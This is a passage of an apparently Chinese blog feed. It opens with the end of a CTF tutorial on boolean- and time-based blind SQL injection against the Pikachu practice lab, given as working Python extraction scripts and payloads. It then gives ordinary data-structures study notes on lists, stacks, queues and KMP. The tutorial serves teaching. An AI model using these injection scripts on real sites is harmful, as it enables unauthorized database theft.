+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> bs4 <span class="comment">#引入漂亮汤</span></span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=kobe&quot;</span></span><br><span class="line">payload_ture=<span class="string">&quot;&#x27;and&#x27;1&#x27;=&#x27;1&quot;</span> <span class="comment">#逻辑真</span></span><br><span class="line">payload_false=<span class="string">&quot;&#x27;and&#x27;1&#x27;=&#x27;2&quot;</span> <span class="comment">#逻辑假</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">url=host+payload_ture+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">req=requests.get(url,headers=headers)  <span class="comment">#使用request获得html文档</span></span><br><span class="line">soup=bs4.BeautifulSoup(req.text,<span class="string">&quot;html.parser&quot;</span>) </span><br><span class="line">targets=soup.find_all(<span class="string">&quot;p&quot;</span>,class_=<span class="string">&quot;notice&quot;</span>) <span class="comment">#使用漂亮汤进行筛选得到目标的回显语句</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(targets))</span><br><span class="line"></span><br><span class="line">url=host+payload_ture+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">req=requests.get(url,headers=headers)  <span class="comment">#使用request获得html文档</span></span><br><span class="line">soup=bs4.BeautifulSoup(req.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">targets=soup.find_all(<span class="string">&quot;p&quot;</span>,class_=<span class="string">&quot;notice&quot;</span>) <span class="comment">#使用漂亮汤进行筛选得到目标的回显语句</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(targets))</span><br></pre></td></tr></table></figure>
+
+<p>分别得到以下的回显，前者为真，后者为假：</p>
+<p><img src="https://i.loli.net/2021/02/24/kAXutZziS9bwDYa.png" alt="image-20210224222948476"></p>
+<p>因为我们每次只能得知，于是我们可以尝试一个个地猜出来，原本的sql注入回显语句字符串的每一位上的字符：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> bs4 <span class="comment">#引入漂亮汤</span></span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=kobe&quot;</span> </span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">maxlength=<span class="number">30</span> <span class="comment">#所检测的最长字符串长度</span></span><br><span class="line">check_data=<span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#125;&#123;!@#$%^&amp;*()&#x27;</span>) <span class="comment">#字典</span></span><br><span class="line">payload=<span class="string">&quot;&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))=&#123;1&#125; and&#x27;1&#x27;=&#x27;1&quot;</span> <span class="comment">#其中select一段可以换成其他查询语句</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; maxlength:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> check_data:</span><br><span class="line">        url=host+payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(x))+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#随具体情况改变</span></span><br><span class="line">        req=requests.get(url,headers=headers) <span class="comment">#使用request获得html文档</span></span><br><span class="line">        soup=bs4.BeautifulSoup(req.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        targets=soup.find_all(<span class="string">&quot;p&quot;</span>,class_=<span class="string">&quot;notice&quot;</span>) <span class="comment">#使用漂亮汤进行筛选得到目标的回显语句</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;your&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(targets): <span class="comment">#根据前面的真假回显得知，当结果中含有your这个单词时，为真</span></span><br><span class="line">            flag=flag+x</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>有的页面的过滤甚至没有回显，但是可以正常执行我们传入的逻辑语句，我们如何才能得语句的回显结果呢？</p>
+<p>可以使用基于时间的盲注，比如在皮卡丘靶场中：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=kobe&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">payload_ture=<span class="string">&quot;&#x27;and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(3),null) and &#x27;1&#x27;=&#x27;1&quot;</span> <span class="comment">#逻辑真</span></span><br><span class="line">payload_false=<span class="string">&quot;&#x27;and if((substr(database(),1,1))=&#x27;a&#x27;,sleep(3),null) and &#x27;1&#x27;=&#x27;2&quot;</span> <span class="comment">#逻辑假</span></span><br><span class="line">url=host+payload_ture+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">stime=time.time()<span class="comment">#开始时间</span></span><br><span class="line">requests.get(url,headers=headers) <span class="comment">#将网址和注入语句拼接请求</span></span><br><span class="line">etime=time.time()<span class="comment">#结束时间</span></span><br><span class="line">delta_time=etime-stime<span class="comment">#时间差</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ture:&quot;</span>,delta_time)</span><br><span class="line"></span><br><span class="line">url=host+payload_false+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">stime=time.time()<span class="comment">#开始时间</span></span><br><span class="line">requests.get(url,headers=headers) <span class="comment">#将网址和注入语句拼接请求</span></span><br><span class="line">etime=time.time()<span class="comment">#结束时间</span></span><br><span class="line">delta_time=etime-stime<span class="comment">#时间差</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;false:&quot;</span>,delta_time)</span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<p><img src="https://i.loli.net/2021/02/24/A7PVDJmKcxEaFGb.png" alt="image-20210224230747271"></p>
+<p>我们只需要判断时间差便可以知道是真还是假，这样剩下的思路就跟boolean型的盲注一样了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> time <span class="comment">#引入时间库</span></span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=kobe&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">maxlength=<span class="number">30</span> <span class="comment">#所检测的最长字符串长度</span></span><br><span class="line">check_data=<span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#125;&#123;!@#$%^&amp;*()&#x27;</span>) <span class="comment">#字典</span></span><br><span class="line">payload=<span class="string">&quot;&#x27;and if(ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),null) and &#x27;1&#x27;=&#x27;1&quot;</span> </span><br><span class="line">i=<span class="number">1</span> <span class="comment">#其中的database()可以换成其他查询语句</span></span><br><span class="line"><span class="keyword">while</span> i &lt; maxlength:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> check_data:</span><br><span class="line">        url=host+payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(x))+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#随具体情况改变</span></span><br><span class="line">        stime=time.time()<span class="comment">#开始时间</span></span><br><span class="line">        requests.get(url,headers=headers) <span class="comment">#使用request获得html文档</span></span><br><span class="line">        etime=time.time()<span class="comment">#结束时间</span></span><br><span class="line">        <span class="keyword">if</span> etime-stime &gt; <span class="number">3</span>: <span class="comment">#当间隔时间大于3秒为真</span></span><br><span class="line">            flag=flag+x</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据结构笔记</title>
+    <url>/2021/05/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h3 id="0、基本知识点"><a href="#0、基本知识点" class="headerlink" title="0、基本知识点"></a>0、基本知识点</h3><p>（1）数据结构是相互之间存在一种或多种特定关系的数据元素的集合。数据是由数据元素组成的，数据元素可以由若干个数据项组成，数据元素是数据的基本单位，数据项是数据的最小单位</p>
+<p>（2）数据结构一般包括数据逻辑结构、数据存储结构和数据运算 3 个方面。数据运算分为抽象运算（运算功能描述）和运算实现两个层次</p>
+<p>（3）数据的逻辑结构分为集合、线性结构、树形结构和图形结构，树形结构和图形结构统称为非线性结构</p>
+<p>（4）数据的存储结构分为顺序存储结构、链式存储结构、索引存储结构和哈希（散列）存储结构</p>
+<p>（5）描述一个求解问题的抽象数据类型由数据逻辑结构和抽象运算两部分组成</p>
+<p>（6）算法是对特定问题求解步骤的一种描述，它是指令的有限序列。运算实现通过算法来表示，<strong>算法具有有穷性、确定性、可行性、输入和输出 5 个重要特征</strong>，<strong>算法满足有穷性，程序不一定满足有穷性</strong>。算法可以用计算机程序来描述，但并不是说任何算法必须用程序来描述</p>
+<h3 id="1、简述数据与数据元素之间的关系与区别"><a href="#1、简述数据与数据元素之间的关系与区别" class="headerlink" title="1、简述数据与数据元素之间的关系与区别"></a>1、简述数据与数据元素之间的关系与区别</h3><p>凡是能被计算机存储、加工的对象统称为数据，数据是一个集合。数据元素是数据的基本单位，是数据的个体。数据元素与数据之间的关系是元素与集合之间的关系</p>
+<h3 id="2、简述数据逻辑结构与存储结构的关系"><a href="#2、简述数据逻辑结构与存储结构的关系" class="headerlink" title="2、简述数据逻辑结构与存储结构的关系"></a>2、简述数据逻辑结构与存储结构的关系</h3><p>在数据结构中，逻辑结构与计算机无关，存储结构是数据元素之间的逻辑关系在计算机中的表示。存储结构不仅将逻辑结构中的所有数据元素存储到计算机内存中，而且还要在内存中存储个数据元素间的逻辑关系。通常情况下，一种逻辑结构可以有多种存储结构，例如线性结构可以采用顺序存储结构和链式存储结构来进行存储</p>
+<h3 id="3、简述数据结构中的运算描述和运算实现的异同"><a href="#3、简述数据结构中的运算描述和运算实现的异同" class="headerlink" title="3、简述数据结构中的运算描述和运算实现的异同"></a>3、简述数据结构中的运算描述和运算实现的异同</h3><p>运算描述是指逻辑结构施加的操作，而运算实现是指一个完成该运算功能的算法。他们的相同点是运算描述和运算实现都能完成对数据的“处理”或某种特定的操作，不同点是运算描述只是描述处理功能，不包括步骤和方法，而运算实现的核心目的是设计处理步骤</p>
+<h3 id="4、数据结构和数据类型有什么区别"><a href="#4、数据结构和数据类型有什么区别" class="headerlink" title="4、数据结构和数据类型有什么区别"></a>4、数据结构和数据类型有什么区别</h3><p>数据就够是相互之间存在一种或多种特定关系的数据元素的集合，一般包括三个方面的内容：<strong>数据的逻辑结构、存储结构和数据的运算</strong>。数据类型是一个值的集合和定义在这个值集上的一组运算的总称，比如C语言中的short int数据类型是由-32768~32767（16位机）的整数和加减乘除取模等运算构成的</p>
+<h3 id="5、在C-C-中提供了引用运算符，简述其在算法描述中的主要作用"><a href="#5、在C-C-中提供了引用运算符，简述其在算法描述中的主要作用" class="headerlink" title="5、在C/C++中提供了引用运算符，简述其在算法描述中的主要作用"></a>5、在C/C++中提供了引用运算符，简述其在算法描述中的主要作用</h3><p>在算法设计中，一个算法通常用一个或多个C/C++函数来实现，在C/C++函数之间传递参数有两种情况，一种是从实参到形参的单向值传递，二是实参和形参之间的双向值传递。对形参使用引用运算符即在形参名前面加上”&amp;”，不仅可以实现实参和形参之间的双向值传递，而且使算法设计简单明晰</p>
+<p>除此之外，在函数的互相调用（如递归算法）的过程中，使用引用型变量可以充当全局变量的职责</p>
+<h3 id="6、算法的时间复杂度反映的是算法的绝对执行时间吗？两个时间复杂度相同的算法，对于相同的问题规模n，它们的绝对执行时间一定相同吗？"><a href="#6、算法的时间复杂度反映的是算法的绝对执行时间吗？两个时间复杂度相同的算法，对于相同的问题规模n，它们的绝对执行时间一定相同吗？" class="headerlink" title="6、算法的时间复杂度反映的是算法的绝对执行时间吗？两个时间复杂度相同的算法，对于相同的问题规模n，它们的绝对执行时间一定相同吗？"></a>6、算法的时间复杂度反映的是算法的绝对执行时间吗？两个时间复杂度相同的算法，对于相同的问题规模n，它们的绝对执行时间一定相同吗？</h3><p>算法的时间复杂度反映的是算法执行时间的数量级，并不是指绝对执行时间，两个时间复杂度相同的算法，对于相同的问题规模n，它们的绝对执行时间也不一定相同</p>
+<h3 id="7、什么是语句频度？语句频度与时间复杂度有什么联系与区别"><a href="#7、什么是语句频度？语句频度与时间复杂度有什么联系与区别" class="headerlink" title="7、什么是语句频度？语句频度与时间复杂度有什么联系与区别"></a>7、什么是语句频度？语句频度与时间复杂度有什么联系与区别</h3><p>一个算法是由控制结构（顺序、循环和分支）和原操作（固有数据类型的操作）组成的，比如在以下算法中：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;					<span class="comment">//1</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)		<span class="comment">//2</span></span><br><span class="line">        a[i]=<span class="number">2</span>*i;			<span class="comment">//3</span></span><br><span class="line">   	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)		<span class="comment">//4</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a[i]);	<span class="comment">//5</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);			<span class="comment">//6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中语句1、3、5、6为原操作</p>
+<p>算法的执行时间取决于控制结构和原操作的综合效果，显然在一个算法中执行原操作的次数越少，其执行时间也就相对越少，执行原操作的次数越多，其执行时间也就相对越多，<strong>一个算法的执行时间可以由其中原操作的执行次数来计量</strong>，算法所有原操作的执行次数被称为语句频度，用T(n)表示</p>
+<p>例：分析以下算法的语句频度T(n)</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">matrixadd</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> A[<span class="number">20</span>][<span class="number">20</span>],<span class="keyword">int</span> B[<span class="number">20</span>][<span class="number">20</span>], <span class="keyword">int</span> C[<span class="number">20</span>][<span class="number">20</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)				<span class="comment">//语句1</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)			<span class="comment">//语句2</span></span><br><span class="line">            C[i][j]=A[i][j]+B[i][j];<span class="comment">//语句3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不考虑变量定义语句，该算法主要包括3个可执行语句，其中语句1循环控制变量<code>i</code>从0增加到<code>n</code>，当<code>i</code>与<code>n</code>相等时才会终止，所以语句1的频度为<code>n+1</code>，但是它对应的循环体（语句2、3）却只能执行<code>n</code>次</p>
+<p>语句2作为语句1循环体内的语句应该只执行<code>n</code>次，但是语句2本身也要执行<code>n+1</code>次，所以语句2的频度为<code>n(n+1)</code>，语句2对应的循环体（语句3）只能执行<code>n*n=n²</code>次</p>
+<p>所以语句3的频度为<code>n²</code></p>
+<p>所以：该算法中所有语句的频度之和为：<br>$$<br>T(n)=n+1+n(n+1)+n^2=2n^2+2n+1<br>$$<br>时间复杂度实际上是对语句频度的一种粗略估计，用于分析算法的时间增长趋势，简单来说，<strong>时间复杂度O(n)保留语句频度T(n)的最高次幂，并且把系数去掉</strong></p>
+<h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><h3 id="1、简述线性表的两种存储结构的主要特点"><a href="#1、简述线性表的两种存储结构的主要特点" class="headerlink" title="1、简述线性表的两种存储结构的主要特点"></a>1、简述线性表的两种存储结构的主要特点</h3><p>线性表的两种存储结构分别是顺序存储结构和链式存储结构</p>
+<p><strong>顺序存储结构</strong>的主要特点有：</p>
+<p>（1）数据元素中只有自身的数据域，没有关联指针域，因此顺序存储结构的存储密度较大</p>
+<p>（2）顺序存储结构需要分配一整块比较大的存储该空间，所以存储空间的利用率较低</p>
+<p>（3）逻辑上相邻的两个元素在物理上也是相邻的，通过元素的逻辑序号可以直接获取其元素值，即具有随机存取的特性</p>
+<p>（4）插入和删除操作会引起大量元素的移动</p>
+<p><strong>链式存储结构</strong>的主要特点有：</p>
+<p>（1）数据结点中除自身的数据域以外还有表示逻辑关系的指针域，因此链式存储结构比顺序存储结构的存储密度小</p>
+<p>（2）链式存储结构的每个结点是单独分配的，每个结点的存储空间相对较小，所以存储空间利用率较高</p>
+<p>（3）在逻辑上相邻的结点在物理上不一定相邻，因此不具有随机存取特性</p>
+<p>（4）插入和删除操作方便、灵活，不必移动结点，只需要修改结点中的指针域即可</p>
+<h3 id="2、简述单链表设置头结点的主要作用"><a href="#2、简述单链表设置头结点的主要作用" class="headerlink" title="2、简述单链表设置头结点的主要作用"></a>2、简述单链表设置头结点的主要作用</h3><p>（1）对于带头结点的单链表，在单链表的任何结点之前插入或删除结点，所要做的都是修改前一个结点的指针域，因此任何结点都有前驱结点（如果单链表没有头结点，则首结点没有前驱结点，在其插入和删除结点时操作复杂一些），所以算法设计方便</p>
+<p>（2）对于带头结点的单链表，在表空时也存在一个头结点，因此空表与非空表的处理是一致的</p>
+<h3 id="3、“线性表的顺序存储表示属于静态结构，而链式存储表示属于动态结构”这句话是否正确"><a href="#3、“线性表的顺序存储表示属于静态结构，而链式存储表示属于动态结构”这句话是否正确" class="headerlink" title="3、“线性表的顺序存储表示属于静态结构，而链式存储表示属于动态结构”这句话是否正确"></a>3、“线性表的顺序存储表示属于静态结构，而链式存储表示属于动态结构”这句话是否正确</h3><p>错误，所谓静态结构是采用固定大小的静态分配方式得到的结果，比如<code>int a[10]</code>，该语句就是一种静态分配方式。所谓动态结构就是采用动态分配方式得到的结果，比如<code>int *p;*p=(int *)malloc(n*sizeof(int))</code>语句就是一种动态分配方式，对于链式存储结构，通常采用动态分配方式，而对于顺序存储结构，既可以采用静态分配方式，也可以采用动态分配方式，只不过为了简单，通常是采用静态分配方式</p>
+<h2 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h2><h3 id="0、基本知识点-1"><a href="#0、基本知识点-1" class="headerlink" title="0、基本知识点"></a>0、基本知识点</h3><p>研究元素的进出栈序列个数：</p>
+<p><strong>n个不同元素通过一个栈所产生的出栈序列的个数为</strong><br>$$<br>\frac{1}{n+1}C^{n}_{2n}<br>$$<br><strong>证明略</strong></p>
+<p>接下来是有关的几道例题：</p>
+<p><strong>（1）如果元素的进栈序列为<code>1234</code>，能否得到<code>3142</code>的出栈序列？</strong></p>
+<p>为了让3作为第一个出栈的元素，必须1、2先进栈，3进栈后出栈，其中栈中从栈底到栈顶分别为1和2，4还未入栈，此时只有可能出现两种情况：一是栈顶的2出栈，二是4入栈后出栈，紧接着3出栈的不是4就是2，不可能是1，所以无法得到<code>3142</code>的出栈序列</p>
+<p><strong>（2）一个栈的进栈序列为<code>1、2、···n</code>通过一个栈可以得到出栈序列<code>p1、p2、···、pn</code>如果p1=3，则p2可能取值的个数是多少</strong></p>
+<p>因为p1=3，所以3是第一个出栈的元素，此时栈中从栈底到栈顶分别为1和2，而3之后的n-3个元素都还没有入栈，所以紧接着出栈的可以是当前栈顶的2，也有可能是之后的n-3个元素，所以p2可以取值的个数是n-2</p>
+<h3 id="1、在一个算法中需要建立多个栈时可以选用以下三种方案之一，试问这些方案相比各有什么优缺点？"><a href="#1、在一个算法中需要建立多个栈时可以选用以下三种方案之一，试问这些方案相比各有什么优缺点？" class="headerlink" title="1、在一个算法中需要建立多个栈时可以选用以下三种方案之一，试问这些方案相比各有什么优缺点？"></a>1、在一个算法中需要建立多个栈时可以选用以下三种方案之一，试问这些方案相比各有什么优缺点？</h3><p><strong>（1）分别用多个顺序存储空间建立多个独立的顺序栈</strong></p>
+<p><strong>优点</strong>：每个栈仅用一个顺序存储空间操作简单，而且几个栈之间不会相互影响</p>
+<p><strong>缺点</strong>：分配空间小了容易产生溢出，分配空间大了容易造成浪费，各个栈不能共享空间</p>
+<p><strong>（2）多个栈共享一个顺序存储空间</strong></p>
+<p><strong>优点</strong>：多个栈仅一个顺序存储空间，充分利用了存储空间，只有在整个存储空间都用完时才会产生溢出</p>
+<p><strong>缺点</strong>：当一个栈满时要向左、右查询有无空闲单元，如果有，需要移动元素和修改相关的栈底和栈顶指针。当接近栈满时要查询空闲单元、移动元素和修改栈底、栈顶指针，这一过程计算复杂且十分耗时</p>
+<p><strong>（3）分别建立多个独立的链栈</strong></p>
+<p><strong>优点</strong>：链栈一般不用考虑栈的溢出</p>
+<p><strong>缺点</strong>：栈中元素以指针相连接，比顺序存储多占用了存储空间</p>
+<h3 id="2、在以下几种存储结构中哪个最适合用作链栈？"><a href="#2、在以下几种存储结构中哪个最适合用作链栈？" class="headerlink" title="2、在以下几种存储结构中哪个最适合用作链栈？"></a>2、在以下几种存储结构中哪个最适合用作链栈？</h3><p><strong>（1）带头结点的单链表（2）不带头结点的循环单链表（3）带头结点的双链表</strong></p>
+<p>栈中元素之间的逻辑关系属于线性关系，可以采用单链表、循环单链表和双链表之一来进行存储，而栈的主要运算是<strong>进栈和出栈</strong>，所以我们在研究某种存储结构是否适合用来做栈，实际上应该考察的是使用这些存储结构来解决<strong>进栈和出栈</strong>问题的复杂度</p>
+<p><strong>（1）使用带头结点的单链表时</strong>，前端作为栈顶，进栈和出栈的时间复杂度为O(1)</p>
+<p>（2）使用不带头结点的循环单链表时，前端作为栈顶，当进行进栈和出栈操作的时候首元结点发生了变化，需要找到尾结点将其next指针指向新的首元结点，进栈和出栈的时间复杂度为O(n)</p>
+<p>（<strong>3）使用带头结点的双链表时</strong>，将前端作为栈顶，进栈和出栈的时间复杂度为O(1)</p>
+<p>就此来看，首先将方案（2）排除，接下来继续对方案（1）（3）进行比较：</p>
+<p>因为方案（1）的单链表的存储密度更高，而且在进栈和出栈操作时，语句频度更低，会更加节省时间，所以选择<strong>带头结点的单链表</strong></p>
+<h3 id="3、什么是队列的上溢现象和假溢出现象，解决假溢出有什么方法？"><a href="#3、什么是队列的上溢现象和假溢出现象，解决假溢出有什么方法？" class="headerlink" title="3、什么是队列的上溢现象和假溢出现象，解决假溢出有什么方法？"></a>3、什么是队列的上溢现象和假溢出现象，解决假溢出有什么方法？</h3><p>在队列的顺序存储结构中，设队头指针为front，队尾指针为rear，队的容量（存储空间的大小）为MaxSize，当有元素进队时，若rear=MaxSize（初始时rear=0），则发生队列的上溢现象，此时不能继续进队。所谓队列假溢出现象是指队列中还有剩余空间但元素并不能进入队列，造成这种现象的原因是队列的设计不合理</p>
+<p>解决队列假溢出的方法：</p>
+<p><strong>（1）建立一个足够大的储存空间</strong></p>
+<p><strong>（2）采用平移元素的方法</strong>，每当进队一个元素，队列中已有的元素向队头移动一个位置（如果有空闲的空间的话），这种方法所对应的运算的时间复杂度为O(n)。或者每当出队一个元素时，依次移动队中的元素，始终使front指针只想队列中的第一个元素位置，这种方法所对应的出队运算的时间复杂度为O(n)</p>
+<p><strong>（3）采用环形队列</strong>，把队列看成一个首尾相接的环形队列，在环形队列上进行进队或出队运算时仍然遵守“先进先出”原则，该方法所对应的进队和出队运算的时间复杂度均为O(1)，在环形队列中，队首指针和队尾指针的自增运算改为自增后模MaxSize</p>
+<h2 id="串"><a href="#串" class="headerlink" title="串"></a>串</h2><h3 id="0、基础知识"><a href="#0、基础知识" class="headerlink" title="0、基础知识"></a>0、基础知识</h3><p>（1）串是若干个字符的有限序列，空串是长度为0的串，可以看作是一种特殊的线性表，其逻辑关系为线性关系</p>
+<p>（2）串的长度是指串中所含字符的个数</p>
+<p><strong>（3）含n个不同字符的串的子串个数为n(n+1)/2+1</strong></p>
+<p>（4）串有顺序串和链串两种存储结构，顺序串的算法设计和顺序表类似，链串的算法设计和单链表类似</p>
+<p><strong>（5）一个串中任意个连续字符组成的序列称为该串的子串，字符串本身是自己的子串，空串是任何串的子串</strong></p>
+<p>（6）在串匹配中一般将主串称为目标串，子串称为模式串</p>
+<p>（7）BF模式匹配算法中需要回溯，（平均）时间复杂度为O(m*n)，而KMP算法消除了回溯，（平均）时间复杂度为O(m+n)</p>
+<h3 id="1、串是一种特殊的线性表，请从存储和运算两方面分析它的特殊之处"><a href="#1、串是一种特殊的线性表，请从存储和运算两方面分析它的特殊之处" class="headerlink" title="1、串是一种特殊的线性表，请从存储和运算两方面分析它的特殊之处"></a>1、串是一种特殊的线性表，请从存储和运算两方面分析它的特殊之处</h3><p>从存储方面看，串中每个元素是单个字符，在设计串存储结构时可以每个存储单元或者结点只储存一个字符。从运算方面看，串有连接、判断相等、求子串和子串替换等基本运算，这是线性表的基本运算所没有的</p>
+<h3 id="2、为什么在模式匹配中BF算法是有回溯算法，而KMP是无回溯算法？"><a href="#2、为什么在模式匹配中BF算法是有回溯算法，而KMP是无回溯算法？" class="headerlink" title="2、为什么在模式匹配中BF算法是有回溯算法，而KMP是无回溯算法？"></a>2、为什么在模式匹配中BF算法是有回溯算法，而KMP是无回溯算法？</h3><p>设目标串为<code>s</code>，模式串为<code>t</code></p>
+<p>在BF算法的匹配过程中，当<code>t[j]</code>与<code>s[i]</code>失配，置<code>i</code>=<code>i</code>-<code>j</code>+1，<code>j</code>=0，从中看到，一旦两个字符不等，目标串指针<code>i</code>会回退，所以BF算法是有回溯算法</p>
+<p>在KMP算法的匹配过程中，当<code>t[j]</code>与<code>s[i]</code>匹配，将<code>i</code>与<code>j</code>分别自增，当<code>t[j]</code>与<code>s[i]</code>失配，<code>i</code>不变，置<code>j</code>=<code>next[j]</code>，从中看到，目标串指针<code>i</code>不会回退，只会保持位置不变或者向前推进，所以KMP算法是无回溯算法</p>
+<h3 id="3、在KMP算法中计算模式串的next值时，在j-0时，为什么要置next-0-1"><a href="#3、在KMP算法中计算模式串的next值时，在j-0时，为什么要置next-0-1" class="headerlink" title="3、在KMP算法中计算模式串的next值时，在j=0时，为什么要置next[0]=-1"></a>3、在KMP算法中计算模式串的next值时，在<code>j</code>=0时，为什么要置<code>next[0]</code>=-1</h3><p>首先我们需要明确，next数组的具体含义是什么？</p>
+<p>next数组的具体含义为：<code>next[j]</code>表示模式串中<code>t[j]</code>之前的子串<code>t[0~j-1]</code>，前缀和后缀相等的最长前后缀长度</p>
+<p>当模式串中的<code>t[0]</code>与目标串中的某一位失配时，说明模式串中已经没有字符可以和目标串中的该位比较（第一位就失配，之后的自然不用考虑），这时候应该将模式串的第一位与目标串中的下一位进行比较，需要令<code>next[0]</code>=-1，用-1这个特殊值来标志这一特殊情况，如果<code>next[0]</code>为0或者其他正整数，就会进行<code>s[i]</code>与<code>t[next[j]]</code>的匹配，实际上陷入了死循环</p>
